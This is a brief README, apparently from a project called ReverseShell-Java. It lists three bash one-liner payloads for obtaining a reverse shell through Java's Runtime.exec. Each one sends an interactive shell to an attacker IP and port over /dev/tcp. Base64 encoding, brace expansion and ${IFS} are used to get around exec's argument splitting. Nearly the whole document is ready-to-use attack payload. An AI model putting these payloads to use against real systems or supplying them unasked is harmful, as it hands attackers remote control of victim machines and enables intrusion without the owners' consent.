# ReverseShell-Java
The project work on generating payloads to reverse shell in different contexts of java.


### Payloads in Runtime.getRuntime().exec(String command):
#### Method1:
bash -c {echo,**BASE64(bash -i >& /dev/tcp/IP/PORT 0>&1)**}|{base64,-d}|{bash,-i}
#### Method2:
bash -c bash${IFS}-i${IFS}>&/dev/tcp/**IP**/**PORT**<&1
#### Method3:
bash -c $@|bash 0 echo bash -i >& /dev/tcp/**IP**/**PORT** 0>&1

